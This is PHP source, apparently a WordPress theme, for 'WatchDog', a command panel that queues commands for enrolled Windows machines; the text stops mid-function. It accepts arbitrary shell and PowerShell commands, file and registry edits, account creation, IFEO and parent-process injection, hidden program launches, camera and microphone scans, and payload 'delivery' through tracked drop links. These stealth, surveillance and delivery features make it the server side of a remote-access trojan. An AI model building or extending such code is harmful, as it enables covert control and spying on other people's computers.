<?php
defined('ABSPATH') || exit;
ob_start();

// 把 PHP 上传限制往大了调，不然传个大文件就崩了，Nginx 那边也得同步改一下
@ini_set('upload_max_filesize', '512M');
@ini_set('post_max_size',       '512M');
@ini_set('memory_limit',        '512M');

define('WD_THEME_VERSION', '1.0.0');
define('WD_THEME_DIR',     get_template_directory());
define('WD_THEME_URL',     get_template_directory_uri());
define('WD_DB_VERSION',    '3');


// ── 把核心类拉进来，插件版和主题版共用一套东西，省得写两遍 ────────────
require_once WD_THEME_DIR . '/includes/class-database.php';
require_once WD_THEME_DIR . '/includes/class-auth.php';
require_once WD_THEME_DIR . '/includes/class-host-manager.php';
require_once WD_THEME_DIR . '/includes/class-log-manager.php';
require_once WD_THEME_DIR . '/includes/class-kook.php';
require_once WD_THEME_DIR . '/includes/class-api.php';

// ── 加几个安全头，防一手基本的攻击，虽然也不一定有人来搞我 ─────────────
add_action('send_headers', 'wd_security_headers');
function wd_security_headers(): void {
    if (headers_sent()) return;
    header('X-Content-Type-Options: nosniff');
    header('Referrer-Policy: strict-origin-when-cross-origin');
    // CSP 的 frame-ancestors 比那套老掉牙的 X-Frame-Options 好用，谁还用那玩意
    header("Content-Security-Policy: frame-ancestors 'self'");
}

// ── 主题一激活就得干活：建表、创页面，不然用户一脸懵逼 ────────────────
add_action('after_switch_theme', 'wd_theme_setup');
function wd_theme_setup(): void {
    WD_Database::install();
    wd_create_pages();
}

// ── 版本升级检测，设成优先级0就是为了抢在所有逻辑之前跑，别问为什么 ────
add_action('init', 'wd_maybe_upgrade_db', 0);
function wd_maybe_upgrade_db(): void {
    if (defined('DOING_AJAX') && DOING_AJAX) return;
    if (get_option('watchdog_db_version') !== WD_DB_VERSION) {
        WD_Database::install();
    }
}

// ── 每次请求都检查一下页面齐不齐，新加的页面在主题已激活的情况下也能补上 ──
add_action('init', 'wd_ensure_pages');
function wd_ensure_pages(): void {
    // 只在 WatchDog 主题亮着的时候跑，AJAX 和 REST 就别凑热闹了，省点性能
    if (defined('DOING_AJAX') && DOING_AJAX) return;
    if (defined('REST_REQUEST') && REST_REQUEST) return;
    // transient 大法好，一小时查一次就够了，别每帧都跑
    if (get_transient('wd_pages_checked')) return;
    wd_create_pages();
    set_transient('wd_pages_checked', 1, HOUR_IN_SECONDS);
}

function wd_create_pages(): void {
    $pages = [
        'wd-login'     => ['WatchDog 登录',    ''],
        'wd-dashboard' => ['仪表盘',            'wd-login'],
        'wd-hosts'     => ['主机管理',           'wd-login'],
        'wd-logs'      => ['日志中心',           'wd-login'],
        'wd-screen'    => ['实时屏幕',           'wd-login'],
        'wd-console'   => ['PowerShell 控制台', 'wd-login'],
        'wd-processes' => ['进程管理',           'wd-login'],
        'wd-files'     => ['文件管理',           'wd-login'],
        'wd-registry'  => ['注册表',             'wd-login'],
        'wd-winusers'  => ['Win用户管理',        'wd-login'],
        'wd-api-keys'  => ['API 管理',          'wd-login'],
        'wd-accounts'  => ['子账号管理',         'wd-login'],
        'wd-kook'      => ['KOOK 机器人',        'wd-login'],
        'wd-profile'   => ['用户中心',            'wd-login'],
        'wd-setup'     => ['WatchDog 安装向导',  ''],
    ];
    foreach ($pages as $slug => [$title, $_parent]) {
        if (!get_page_by_path($slug)) {
            wp_insert_post([
                'post_title'  => $title,
                'post_name'   => $slug,
                'post_status' => 'publish',
                'post_type'   => 'page',
            ]);
        }
    }
}

// ── 页面路由：哪个页面该用哪个模板，我在这配好了 ─────────────────────
// 重定向守卫得在 template_redirect 里搞，这时候还没输出东西，来得及拦
add_action('template_redirect', 'wd_redirect_guard');
function wd_redirect_guard(): void {
    if (!is_page()) return;

    $slug = get_post_field('post_name', get_queried_object_id());

    // 没登录又不在登录页和安装向导页？不好意思，送你回登录页
    if ($slug !== 'wd-login' && $slug !== 'wd-setup' && !wd_is_logged_in()) {
        $login = get_page_by_path('wd-login');
        wp_redirect($login ? get_permalink($login->ID) : home_url('/wd-login/'));
        exit;
    }

    // 登录了但没权限看这个页面？回仪表盘呆着去
    if (wd_is_logged_in() && !wd_can_access($slug)) {
        $dash = get_page_by_path('wd-dashboard');
        wp_redirect($dash ? get_permalink($dash->ID) : home_url('/wd-dashboard/'));
        exit;
    }
}

add_filter('template_include', 'wd_template_router');
function wd_template_router(string $template): string {
    if (!is_page()) return $template;

    $slug = get_post_field('post_name', get_queried_object_id());

    $map = [
        'wd-login'     => 'page-login.php',
        'wd-dashboard' => 'page-dashboard.php',
        'wd-hosts'     => 'page-hosts.php',
        'wd-logs'      => 'page-logs.php',
        'wd-screen'    => 'page-screen.php',
        'wd-camera'    => 'page-camera.php',
        'wd-console'   => 'page-console.php',
        'wd-processes' => 'page-processes.php',
        'wd-files'     => 'page-files.php',
        'wd-registry'  => 'page-registry.php',
        'wd-winusers'  => 'page-winusers.php',
        'wd-delivery'  => 'page-delivery.php',
        'wd-api-keys'  => 'page-api-keys.php',
        'wd-accounts'  => 'page-accounts.php',
        'wd-kook'      => 'page-kook.php',
        'wd-profile'   => 'page-profile.php',
        'wd-setup'     => 'page-setup.php',
    ];
    if (isset($map[$slug])) {
        $path = WD_THEME_DIR . '/templates/' . $map[$slug];
        if (file_exists($path)) return $path;
    }
    return $template;
}

// ── 登录态判断：管理员或者 WatchDog 子账号都算已登录 ───────────────
function wd_is_logged_in(): bool {
    if (!is_user_logged_in()) return false;
    if (current_user_can('manage_options')) return true;
    return (bool) get_user_meta(get_current_user_id(), 'watchdog_sub_account', true);
}

// ── 只有管理员才能干的活 ─────────────────────────────────────────────
function wd_is_admin(): bool {
    return is_user_logged_in() && current_user_can('manage_options');
}

// ── 注册 CSS 和 JS，只有 WatchDog 页面才加载，不污染前端 ────────────
add_action('wp_enqueue_scripts', 'wd_enqueue_assets');
function wd_enqueue_assets(): void {
    if (!is_page()) return;
    $slug = get_post_field('post_name', get_queried_object_id());
    if (!str_starts_with($slug, 'wd-')) return;

    wp_enqueue_style('wd-theme', WD_THEME_URL . '/assets/css/theme.css', [], WD_THEME_VERSION);

    // 登录页自己搞定 WD 对象和 doLogin()，不需要 app.js 掺和
    // 而且 app.js 一加载就发 wd_get_hosts，没登录的话接口会返回 400，何必呢
    if ($slug === 'wd-login') return;

    wp_enqueue_script('wd-app', WD_THEME_URL . '/assets/js/app.js', [], WD_THEME_VERSION, false);
    wp_localize_script('wd-app', 'WD', [
        'ajax_url'   => admin_url('admin-ajax.php'),
        'rest_url'   => rest_url('watchdog/v1/'),
        'nonce'      => wp_create_nonce('wd_nonce'),
        'rest_nonce' => wp_create_nonce('wp_rest'),
        'ws_host'    => get_option('watchdog_ws_host', ''),
        'plugin_url' => WD_THEME_URL,
        'pages'      => wd_page_urls(),
    ]);
}

function wd_page_urls(): array {
    $slugs = ['wd-login','wd-dashboard','wd-hosts','wd-logs','wd-screen','wd-console','wd-api-keys','wd-accounts','wd-kook'];
    $urls  = [];
    foreach ($slugs as $s) {
        $page = get_page_by_path($s);
        $urls[$s] = $page ? get_permalink($page->ID) : '#';
    }
    return $urls;
}

// ── AJAX 处理入口，能复用的逻辑就不重复写了 ─────────────────────────
add_action('wp_ajax_wd_get_hosts',        'wd_ajax_get_hosts');
add_action('wp_ajax_wd_get_logs',         'wd_ajax_get_logs');
add_action('wp_ajax_wd_create_api_key',   'wd_ajax_create_api_key');
add_action('wp_ajax_wd_toggle_api_key',   'wd_ajax_toggle_api_key');
add_action('wp_ajax_wd_delete_api_key',   'wd_ajax_delete_api_key');
add_action('wp_ajax_wd_list_api_keys',    'wd_ajax_list_api_keys');
add_action('wp_ajax_wd_send_command',     'wd_ajax_send_command');
add_action('wp_ajax_wd_push_cmd',         'wd_ajax_push_cmd');
add_action('wp_ajax_wd_save_kook',        'wd_ajax_save_kook');
add_action('wp_ajax_wd_kook_test',        'wd_ajax_kook_test');
add_action('wp_ajax_wd_kook_check',       'wd_ajax_kook_check');
add_action('wp_ajax_wd_save_kook_webhook','wd_ajax_save_kook_webhook');
add_action('wp_ajax_wd_delete_host',      'wd_ajax_delete_host');
add_action('wp_ajax_wd_rename_host',      'wd_ajax_rename_host');
add_action('wp_ajax_wd_mark_host_offline','wd_ajax_mark_host_offline');
add_action('wp_ajax_wd_get_ws_token',     'wd_ajax_get_ws_token');
add_action('wp_ajax_wd_delete_account',       'wd_ajax_delete_account');
add_action('wp_ajax_wd_update_sub_perms',     'wd_ajax_update_sub_perms');
add_action('wp_ajax_wd_create_sub_account',   'wd_ajax_create_sub_account');
add_action('wp_ajax_wd_get_all_hosts_admin',   'wd_ajax_get_all_hosts_admin');
add_action('wp_ajax_wd_save_ws_host',     'wd_ajax_save_ws_host');
add_action('wp_ajax_wd_get_cmd_result',   'wd_ajax_get_cmd_result');
add_action('wp_ajax_wd_change_password',  'wd_ajax_change_password');
add_action('wp_ajax_wd_update_profile',   'wd_ajax_update_profile');
add_action('wp_ajax_wd_setup_check',      'wd_ajax_setup_check');
add_action('wp_ajax_wd_setup_save_ws',    'wd_ajax_setup_save_ws');
add_action('wp_ajax_wd_setup_finish',     'wd_ajax_setup_finish');
add_action('wp_ajax_wd_login',            'wd_ajax_login');
add_action('wp_ajax_nopriv_wd_login',     'wd_ajax_login');
add_action('wp_ajax_wd_logout',           'wd_ajax_logout');
add_action('wp_ajax_wd_ai_chat',          'wd_ajax_ai_chat');
add_action('wp_ajax_wd_save_ai_key',      'wd_ajax_save_ai_key');
add_action('wp_ajax_wd_get_ai_key',       'wd_ajax_get_ai_key');
add_action('wp_ajax_wd_delivery_upload',       'wd_ajax_delivery_upload');
add_action('wp_ajax_wd_delivery_upload_chunk','wd_ajax_delivery_upload_chunk');
add_action('wp_ajax_wd_delivery_list',        'wd_ajax_delivery_list');
add_action('wp_ajax_wd_delivery_delete',      'wd_ajax_delivery_delete');
add_action('wp_ajax_wd_create_drop_token',         'wd_ajax_create_drop_token');
add_action('wp_ajax_wd_list_drop_tokens',          'wd_ajax_list_drop_tokens');
add_action('wp_ajax_wd_delete_drop_token',         'wd_ajax_delete_drop_token');
add_action('wp_ajax_nopriv_wd_drop_dl_ping',       'wd_ajax_drop_dl_ping');
add_action('wp_ajax_wd_drop_dl_ping',              'wd_ajax_drop_dl_ping');
add_action('init', 'wd_handle_drop_landing',       1);
add_action('init', 'wd_handle_drop_ping',          1);

function wd_verify(): void {
    check_ajax_referer('wd_nonce', 'nonce');
    if (!wd_is_logged_in()) wp_send_json_error(['message' => '权限不足'], 403);
}

// 只有管理员才能碰的操作：删子账号、管 API Key 什么的
function wd_verify_admin(): void {
    check_ajax_referer('wd_nonce', 'nonce');
    if (!wd_is_admin()) wp_send_json_error(['message' => '权限不足，需要管理员账号'], 403);
}

function wd_ajax_login(): void {
    check_ajax_referer('wd_nonce', 'nonce');
    $user = wp_signon([
        'user_login'    => sanitize_user($_POST['username'] ?? ''),
        'user_password' => $_POST['password'] ?? '',
        'remember'      => true,
    ], is_ssl());
    if (is_wp_error($user)) {
        wp_send_json_error(['message' => '用户名或密码错误']);
        return;
    }
    // 登录成功后直接算好该去哪，免得先跳到仪表盘又被 302 到安装向导，折腾
    // 子账号不用走安装向导，直接丢仪表盘
    if (!get_option('wd_setup_complete') && wd_is_admin()) {
        $setup    = get_page_by_path('wd-setup');
        $redirect = $setup ? get_permalink($setup->ID) : home_url('/wd-setup/');
    } else {
        $dashboard = get_page_by_path('wd-dashboard');
        $redirect  = $dashboard ? get_permalink($dashboard->ID) : home_url('/wd-dashboard/');
    }
    // 有人登录了 WatchDog 后台，给 KOOK 吱一声
    $ip = sanitize_text_field(
        $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '?'
    );
    WD_Kook::notify_log(
        'wd_login',
        'WatchDog 平台',
        "账号 `{$user->user_login}` 已登录管理平台，IP：`{$ip}`"
    );
    wp_send_json_success(['redirect' => $redirect]);
}

function wd_ajax_logout(): void {
    check_ajax_referer('wd_nonce', 'nonce');
    wp_logout();
    $login = get_page_by_path('wd-login');
    $url   = $login ? get_permalink($login->ID) : home_url('/wd-login/');
    wp_send_json_success(['redirect' => $url]);
}

// 从 WordPress 退出后也要跳回 WatchDog 的登录页，别让人迷路
add_filter('logout_redirect', function(string $redirect_to): string {
    $login = get_page_by_path('wd-login');
    return $login ? get_permalink($login->ID) : home_url('/wd-login/');
});

function wd_ajax_get_hosts(): void {
    wd_verify();
    WD_Host_Manager::mark_offline_stale();
    $page   = max(1, (int)($_GET['page'] ?? 1));
    $status = sanitize_key($_GET['status'] ?? '');
    // 子账号只能看被分配的主机，管理员全都能看
    $allowed_ids = null;
    if (!wd_is_admin()) {
        $uid = get_current_user_id();
        $raw = get_user_meta($uid, 'watchdog_allowed_hosts', true);
        if ($raw !== '' && $raw !== false) {
            $allowed_ids = array_map('intval', json_decode($raw, true) ?: []);
        }
    }
    wp_send_json_success(WD_Host_Manager::get_list($page, 20, $status, $allowed_ids));
}

function wd_ajax_get_all_hosts_admin(): void {
    wd_verify_admin();
    wp_send_json_success(WD_Host_Manager::get_all_simple());
}

function wd_ajax_get_logs(): void {
    wd_verify();
    wp_send_json_success(WD_Log_Manager::query([
        'host_id'   => (int)($_GET['host_id'] ?? 0),
        'log_type'  => sanitize_key($_GET['log_type'] ?? ''),
        'date_from' => sanitize_text_field($_GET['date_from'] ?? ''),
        'date_to'   => sanitize_text_field($_GET['date_to'] ?? ''),
        'page'      => (int)($_GET['page'] ?? 1),
        'per_page'  => (int)($_GET['per_page'] ?? 50),
    ]));
}

function wd_ajax_create_api_key(): void {
    wd_verify_admin();
    $result = WD_Auth::create(
        sanitize_text_field($_POST['name'] ?? ''),
        sanitize_text_field($_POST['category'] ?? '')
    );
    is_wp_error($result)
        ? wp_send_json_error(['message' => $result->get_error_message()])
        : wp_send_json_success($result);
}

function wd_ajax_list_api_keys(): void {
    wd_verify();
    global $wpdb;
    $keys = $wpdb->get_results(
        "SELECT id, name, category, api_key, is_active, created_at
         FROM {$wpdb->prefix}watchdog_api_keys ORDER BY created_at DESC",
        ARRAY_A
    );
    wp_send_json_success($keys ?: []);
}

function wd_ajax_toggle_api_key(): void {
    wd_verify_admin();
    global $wpdb;
    $id      = (int)($_POST['id'] ?? 0);
    $current = (int)$wpdb->get_var($wpdb->prepare(
        "SELECT is_active FROM {$wpdb->prefix}watchdog_api_keys WHERE id=%d", $id
    ));
    $wpdb->update("{$wpdb->prefix}watchdog_api_keys", ['is_active' => $current ? 0 : 1], ['id' => $id], ['%d'], ['%d']);
    wp_send_json_success(['is_active' => !$current]);
}

function wd_ajax_delete_api_key(): void {
    wd_verify_admin();
    global $wpdb;
    $wpdb->delete("{$wpdb->prefix}watchdog_api_keys", ['id' => (int)($_POST['id'] ?? 0)], ['%d']);
    wp_send_json_success();
}

function wd_ajax_send_command(): void {
    wd_verify();
    global $wpdb;
    $host_id  = (int)($_POST['host_id']  ?? 0);
    $cmd_type = sanitize_key($_POST['cmd_type'] ?? '');
    $payload  = wp_unslash($_POST['payload'] ?? '');
    $allowed = [
        'shell','powershell','open_program','kill_program',
        'get_processes','kill_process',
        'list_drives','list_dir','read_file','write_file','delete_file',
        'list_registry','set_registry','delete_registry_value','delete_registry_key',
        'list_win_users','create_win_user','delete_win_user',
        'set_win_user_password','enable_win_user','disable_win_user',
        'remote_run',
        'ifeo_inject','ifeo_eject','ifeo_list',
        'ppid_inject',
        'hidden_app_launch','hidden_app_stop',
    ];
    if (!$host_id || !in_array($cmd_type, $allowed, true)) {
        wp_send_json_error(['message' => '参数不完整或类型不允许']);
    }
    $wpdb->insert("{$wpdb->prefix}watchdog_cmd_queue", [
        'host_id'    => $host_id, 'cmd_type' => $cmd_type,
        'payload'    => $payload, 'status'   => 'pending',
        'created_by' => get_current_user_id(),
    ], ['%d','%s','%s','%s','%d']);
    $cmd_id = $wpdb->insert_id;
    // 指令下发了，给 KOOK 通知一声，谁在什么时候干了什么
    $host = WD_Host_Manager::get_by_id($host_id);
    if ($host) {
        WD_Kook::notify_log('cmd_exec', $host['name'], "指令已下发：`{$cmd_type}` " . ($payload ? "参数：`{$payload}`" : ''));
    }
    wp_send_json_success(['cmd_id' => $cmd_id]);
}

// 摄像头/麦克风扫描使用的快捷推送：接受 host_id + cmd（原始 shell 字符串）
function wd_ajax_push_cmd(): void {
    wd_verify();
    global $wpdb;
    $host_id = (int)($_POST['host_id'] ?? 0);
    $cmd     = wp_unslash(trim($_POST['cmd'] ?? ''));
    if (!$host_id || $cmd === '') {
        wp_send_json_error(['message' => '参数不完整']);
    }
    $wpdb->insert("{$wpdb->prefix}watchdog_cmd_queue", [
        'host_id'    => $host_id,
        'cmd_type'   => 'powershell',
        'payload'    => $cmd,
        'status'     => 'pending',
        'created_by' => get_current_user_id(),
    ], ['%d','%s','%s','%s','%d']);
    wp_send_json_success(['cmd_id' => $wpdb->insert_id]);
}

function wd_ajax_save_kook(): void {
    wd_verify_admin();
    WD_Kook::save_settings(
        sanitize_text_field($_POST['bot_token'] ?? ''),
        sanitize_text_field($_POST['default_channel_id'] ?? ''),
        json_decode(stripslashes($_POST['notify_rules'] ?? '{}'), true) ?? []
    );
    wp_send_json_success(['message' => '配置已保存']);
}

function wd_ajax_kook_test(): void {
    wd_verify_admin();
    $settings    = WD_Kook::get_settings();
    $channel     = $settings['default_channel_id'] ?? '';
    $cmd_channel = get_option('wd_kook_cmd_channel', '');

    // 优先使用默认推送频道，若失败自动降级到指令频道
    $targets = array_filter(array_unique([$channel, $cmd_channel]));
    if (empty($targets)) {
        wp_send_json_error(['message' => '请先配置默认推送频道 ID 或指令接收频道 ID']);
    }

    $last_error = null;
    foreach ($targets as $ch) {
        $result = WD_Kook::send($ch, ':bell: **[WatchDog]** 测试消息，配置正常！');
        if (!is_wp_error($result)) {
            wp_send_json_success(['channel' => $ch]);
        }
        $last_error = $result->get_error_message();
    }
    wp_send_json_error([
        'message' => $last_error . '（提示：请将"默认推送频道 ID"改为 Bot 已加入服务器的文字频道 ID）',
    ]);
}

function wd_ajax_kook_check(): void {
    wd_verify_admin();
    $result = WD_Kook::check_bot();
    if (is_wp_error($result)) {
        wp_send_json_error(['message' => $result->get_error_message()]);
    }
    wp_send_json_success([
        'username' => $result['username'] ?? '未知',
        'bot'      => $result['bot'] ?? false,
        'online'   => $result['online'] ?? false,
    ]);
}

// ── 子账号权限体系，管得还算细 ───────────────────────────────────────

/** 子账号能用的模块列表，管理员专属的模块不在这里出现 */
function wd_sub_perm_list(): array {
    return [
        'wd-hosts'     => '主机管理',
        'wd-logs'      => '日志中心',
        'wd-screen'    => '实时屏幕',
        'wd-camera'    => '摄像头 & 麦克风',
        'wd-console'   => 'PowerShell 控制台',
        'wd-processes' => '进程管理',
        'wd-files'     => '文件管理',
        'wd-registry'  => '注册表',
        'wd-winusers'  => 'Win 用户管理',
        'wd-delivery'  => '远程投递',
    ];
}

/** 获取子账号被允许访问的页面 slug 列表（管理员返回 null 表示无限制） */
function wd_get_sub_perms(int $user_id): ?array {
    if (!get_user_meta($user_id, 'watchdog_sub_account', true)) return null; // 不是子账号，不归我管
    $raw = get_user_meta($user_id, 'watchdog_permissions', true);
    if ($raw === '' || $raw === false) {
        // 新建的账号默认给全部子账号模块，省的他们说我抠门
        return array_keys(wd_sub_perm_list());
    }
    return json_decode($raw, true) ?: [];
}

/** 当前用户是否可访问指定页面 slug */
function wd_can_access(string $slug): bool {
    if (wd_is_admin()) return true;
    // 仪表盘和个人中心谁都能看，不用拦
    if (in_array($slug, ['wd-dashboard', 'wd-profile', 'wd-setup'], true)) return true;
    // 这几个页面只有管理员能进，子账号就别想了
    if (in_array($slug, ['wd-api-keys', 'wd-accounts', 'wd-kook'], true)) return false;
    $uid   = get_current_user_id();
    $perms = wd_get_sub_perms($uid);
    return $perms !== null && in_array($slug, $perms, true);
}

function wd_ajax_create_sub_account(): void {
    wd_verify_admin();
    $username = sanitize_user($_POST['username'] ?? '');
    $email    = sanitize_email($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';

    if (!$username || !$email || !$password) {
        wp_send_json_error(['message' => '请填写完整信息（用户名、邮箱、密码）']);
    }
    if (strlen($password) < 8) {
        wp_send_json_error(['message' => '密码至少 8 位']);
    }
    if (username_exists($username)) {
        wp_send_json_error(['message' => "用户名「{$username}」已存在"]);
    }
    if (email_exists($email)) {
        wp_send_json_error(['message' => "邮箱「{$email}」已被注册"]);
    }

    if (!get_role('watchdog_viewer')) {
        add_role('watchdog_viewer', 'WatchDog 观察员', ['read' => true]);
    }

    $uid = wp_create_user($username, $password, $email);
    if (is_wp_error($uid)) {
        wp_send_json_error(['message' => $uid->get_error_message()]);
    }

    $u = new WP_User($uid);
    $u->set_role('watchdog_viewer');
    add_user_meta($uid, 'watchdog_sub_account', 1);

    $perms_raw     = $_POST['init_perms'] ?? '';
    $default_perms = ($perms_raw !== '')
        ? (json_decode(stripslashes($perms_raw), true) ?: array_keys(wd_sub_perm_list()))
        : array_keys(wd_sub_perm_list());
    update_user_meta($uid, 'watchdog_permissions', wp_json_encode($default_perms));

    $hosts_raw = $_POST['init_hosts'] ?? null;
    if ($hosts_raw !== null && $hosts_raw !== '') {
        $host_ids = array_map('intval', json_decode(stripslashes($hosts_raw), true) ?: []);
        update_user_meta($uid, 'watchdog_allowed_hosts', wp_json_encode($host_ids));
    }

    wp_send_json_success(['message' => "子账号「{$username}」创建成功", 'user_id' => $uid]);
}

function wd_ajax_update_sub_perms(): void {
    wd_verify_admin();
    $uid = (int)($_POST['user_id'] ?? 0);
    if (!$uid || !get_user_meta($uid, 'watchdog_sub_account', true)) {
        wp_send_json_error(['message' => '无效的子账号 ID']);
    }
    // 模块权限
    $allowed = array_keys(wd_sub_perm_list());
    $perms   = array_values(array_intersect(
        json_decode(stripslashes($_POST['perms'] ?? '[]'), true) ?: [],
        $allowed
    ));
    update_user_meta($uid, 'watchdog_permissions', wp_json_encode($perms));
    // 主机白名单（空数组 = 允许全部）
    $raw_hosts   = $_POST['hosts'] ?? null;
    if ($raw_hosts !== null) {
        $host_ids = array_map('intval', json_decode(stripslashes($raw_hosts), true) ?: []);
        update_user_meta($uid, 'watchdog_allowed_hosts', wp_json_encode($host_ids));
    }
    wp_send_json_success(['message' => '权限已更新']);
}

function wd_ajax_delete_host(): void {
    wd_verify();
    WD_Host_Manager::delete((int)($_POST['id'] ?? 0));
    wp_send_json_success();
}

function wd_ajax_rename_host(): void {
    wd_verify();
    WD_Host_Manager::update_name((int)($_POST['id'] ?? 0), sanitize_text_field($_POST['name'] ?? ''));
    wp_send_json_success();
}

function wd_ajax_mark_host_offline(): void {
    wd_verify();
    $host_id = (int)($_POST['host_id'] ?? 0);
    if (!$host_id) wp_send_json_error(['message' => 'host_id required']);
    global $wpdb;
    $wpdb->update(
        "{$wpdb->prefix}watchdog_hosts",
        ['status' => 'offline'],
        ['id' => $host_id, 'status' => 'online'],   // 只改在线的，防重复
        ['%s'],
        ['%d', '%s']
    );
    wp_send_json_success();
}

function wd_ajax_get_ws_token(): void {
    wd_verify();
    $host_id = (int)($_POST['host_id'] ?? 0);
    if (!$host_id) wp_send_json_error(['message' => 'host_id missing']);
    wp_send_json_success(['token' => WD_Auth::generate_ws_token($host_id)]);
}

function wd_ajax_delete_account(): void {
    wd_verify_admin();
    $uid = (int)($_POST['user_id'] ?? 0);
    if (!get_user_meta($uid, 'watchdog_sub_account', true)) {
        wp_send_json_error(['message' => '只能删除通过 WatchDog 创建的子账号']);
    }
    require_once ABSPATH . 'wp-admin/includes/user.php';
    wp_delete_user($uid);
    wp_send_json_success();
}

function wd_ajax_save_ws_host(): void {
    wd_verify_admin();
    update_option('watchdog_ws_host', sanitize_text_field($_POST['ws_host'] ?? ''));
    wp_send_json_success();
}

function wd_ajax_change_password(): void {
    wd_verify();
    $user_id  = get_current_user_id();
    $old_pass = $_POST['old_password'] ?? '';
    $new_pass = $_POST['new_password'] ?? '';
    if (!$user_id || !$old_pass || !$new_pass) {
        wp_send_json_error(['message' => '参数不完整']);
    }
    $user = get_user_by('id', $user_id);
    if (!$user || !wp_check_password($old_pass, $user->user_pass, $user_id)) {
        wp_send_json_error(['message' => '当前密码不正确']);
    }
    if (strlen($new_pass) < 8) {
        wp_send_json_error(['message' => '新密码至少 8 位']);
    }
    wp_set_password($new_pass, $user_id);
    wp_send_json_success(['message' => '密码已更新，请重新登录']);
}

function wd_ajax_update_profile(): void {
    wd_verify();
    $user_id   = get_current_user_id();
    $nickname  = sanitize_text_field($_POST['nickname']  ?? '');
    $email     = sanitize_email($_POST['email']          ?? '');
    if (!$user_id) wp_send_json_error(['message' => '未登录']);
    $data = ['ID' => $user_id];
    if ($nickname) $data['display_name'] = $nickname;
    if ($email && is_email($email)) $data['user_email'] = $email;
    $result = wp_update_user($data);
    is_wp_error($result)
        ? wp_send_json_error(['message' => $result->get_error_message()])
        : wp_send_json_success(['message' => '资料已更新']);
}

function wd_ajax_get_cmd_result(): void {
    wd_verify();
    global $wpdb;
    $cmd_id = (int)($_GET['cmd_id'] ?? 0);
    $row    = $wpdb->get_row($wpdb->prepare(
        "SELECT id, status, result, executed_at FROM {$wpdb->prefix}watchdog_cmd_queue WHERE id=%d", $cmd_id
    ), ARRAY_A);
    $row ? wp_send_json_success($row) : wp_send_json_error(['message' => 'not found'], 404);
}

// ── REST API 注册，跟 AJAX 走同一套逻辑 ────────────────────────────
add_action('rest_api_init', ['WD_API', 'register_routes']);

// ── 把 WP 的管理栏藏起来，这套界面够用了不用再多个横条 ──────────────
add_filter('show_admin_bar', '__return_false');

// ── 不让别人直接访问 wp-login.php，全部重定向到主题的登录页 ─────────
add_action('login_init', function () {
    $login_page = get_page_by_path('wd-login');
    if ($login_page && isset($_GET['redirect_to'])) {
        wp_redirect(get_permalink($login_page->ID));
        exit;
    }
});

// ── 安装向导的 AJAX 接口，一步步引导用户配好环境 ─────────────────────

/**
 * 第一步：检查数据库表有没有建好，没有的话试着建一下
 */

function wd_ajax_setup_check(): void {
    wd_verify();
    global $wpdb;
    $required = ['watchdog_hosts', 'watchdog_api_keys', 'watchdog_logs', 'watchdog_cmd_queue'];
    $missing  = [];
    foreach ($required as $t) {
        if ($wpdb->get_var("SHOW TABLES LIKE '{$wpdb->prefix}{$t}'") !== $wpdb->prefix . $t) {
            $missing[] = $t;
        }
    }
    if ($missing) {
        WD_Database::install();
        $still_missing = [];
        foreach ($missing as $t) {
            if ($wpdb->get_var("SHOW TABLES LIKE '{$wpdb->prefix}{$t}'") !== $wpdb->prefix . $t) {
                $still_missing[] = $t;
            }
        }
        if ($still_missing) {
            wp_send_json_error(['message' => '数据表创建失败：' . implode(', ', $still_missing)]);
        }
    }
    $ws_host   = get_option('watchdog_ws_host', '');
    $key_count = (int)$wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}watchdog_api_keys");
    wp_send_json_success([
        'db_ok'     => true,
        'ws_host'   => $ws_host,
        'has_key'   => $key_count > 0,
        'ws_secret' => get_option('watchdog_ws_secret', '（未生成，请先访问任意页面让 WP 初始化）'),
    ]);
}

/**
 * 第二步：保存 WebSocket 地址，顺便 ping 一下看通不通
 */
function wd_ajax_setup_save_ws(): void {
    wd_verify();
    $ws_host = sanitize_text_field(trim($_POST['ws_host'] ?? ''));
    if (!$ws_host) wp_send_json_error(['message' => '请填写 WebSocket 地址']);

    update_option('watchdog_ws_host', $ws_host);

    // 试一下 ws-relay 的 /ping 接口，看看中继服务活着没
    $ping_url = preg_replace('#^wss?://#', 'http://', $ws_host);
    $ping_url = rtrim($ping_url, '/') . '/ping';
    $resp     = wp_remote_get($ping_url, ['timeout' => 5, 'sslverify' => false]);
    $ping_ok  = !is_wp_error($resp) && wp_remote_retrieve_response_code($resp) === 200;

    wp_send_json_success([
        'saved'   => true,
        'ping_ok' => $ping_ok,
        'message' => $ping_ok ? 'WebSocket 中继连接正常' : '地址已保存，但 /ping 未响应（中继服务可能尚未启动）',
    ]);
}

/**
 * 第三步：安装完成，打上标记，跳转到仪表盘
 */
function wd_ajax_setup_finish(): void {
    wd_verify_admin();
    update_option('wd_setup_complete', '1');
    $dashboard = get_page_by_path('wd-dashboard');
    wp_send_json_success([
        'redirect' => $dashboard ? get_permalink($dashboard->ID) : home_url('/wd-dashboard/'),
    ]);
}

// ── DeepSeek AI 助手 ───────────────────────────────────────────────

function wd_ajax_ai_chat(): void {
    check_ajax_referer('wd_nonce', 'nonce');
    if (!is_user_logged_in()) wp_send_json_error(['message' => '请先登录'], 403);

    $message = sanitize_textarea_field(wp_unslash($_POST['message'] ?? ''));
    if (empty($message)) wp_send_json_error(['message' => '消息不能为空']);

    $api_key = get_option('wd_deepseek_api_key', '');
    if (empty($api_key)) {
        wp_send_json_error(['message' => '请先在「API 管理」页面底部配置 DeepSeek API Key']);
    }

    // 把历史消息攒一下，用 sanitize_textarea_field 保留下换行和代码块
    $history = [];
    if (!empty($_POST['history']) && is_array($_POST['history'])) {
        foreach ($_POST['history'] as $h) {
            $role    = in_array($h['role'] ?? '', ['user', 'assistant'], true) ? $h['role'] : null;
            $content = sanitize_textarea_field(wp_unslash($h['content'] ?? ''));
            if ($role && $content) $history[] = ['role' => $role, 'content' => $content];
        }
    }

    // 上下文太长会烧钱，粗略按字符数算一下 token，超过 6000 个字符就把最早的消息扔了
    $total_chars = array_sum(array_map(fn($h) => strlen($h['content']), $history));
    while ($total_chars > 6000 && count($history) > 2) {
        $removed      = array_shift($history);
        $total_chars -= strlen($removed['content']);
    }

    $sys = "你是 Windows 终端命令助手，用中文简短回答，直接给出命令，命令放代码块里。";

    $messages = [['role' => 'system', 'content' => $sys]];
    foreach ($history as $h) $messages[] = $h;
    $messages[] = ['role' => 'user', 'content' => $message];

